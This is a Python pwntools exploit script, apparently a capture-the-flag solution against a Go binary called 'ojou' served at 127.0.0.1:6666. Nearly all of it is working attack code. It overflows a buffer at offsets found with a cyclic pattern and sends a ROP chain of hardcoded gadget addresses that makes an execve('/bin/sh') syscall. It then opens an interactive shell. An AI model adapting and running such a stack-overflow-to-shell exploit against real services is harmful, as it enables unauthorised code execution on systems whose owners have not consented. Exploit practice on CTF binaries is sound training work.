#!usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = '../dist/ojou'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'info'
host, port = '127.0.0.1', 6666

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
break *0x47de6d
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
def exploit():
    global io
    io = initialize()
    
    prefix = b'Ojou! <3'
    
    fuzz = cyclic(200)
    # phase 1
    # offset:                                      146                 154
    # runtime.slicebytetostring(0x4b5ca8?, 0x616a626161696261, 0x616c6261616b6261)
    
    # phase 2 
    # offset:                                                             160
    # runtime: g 1: unexpected return pc for main.main called from 0x6261616d6261616c
    
    ropchain = b''
    ropchain += cyclic(146)
    ropchain += p64(0x496959) + p64(0x10)
    ropchain += cyclic(160)
    # ropchain += p64(elf.sym['main.main'])
    ropchain += p64(0x40453f)   # add al, ch ; pop rbx ; ret
    ropchain += p64(0x497d19)   # *(/bin/sh)
    ropchain += p64(0x404408)   # pop rax ; pop rbp ; ret
    ropchain += p64(0x3b)       # execve
    ropchain += p64(0x0)        
    ropchain += p64(0x479d7a)   # pop rdx ; ret
    ropchain += p64(0x0)
    ropchain += p64(0x403166)   # mov rsi, rcx ; mov rdi, rbx ; syscall
    
    # payload = prefix + fuzz
    payload = prefix + ropchain
    io.sendlineafter(b'>>', payload)

    io.interactive()
    
if __name__ == '__main__':
    exploit()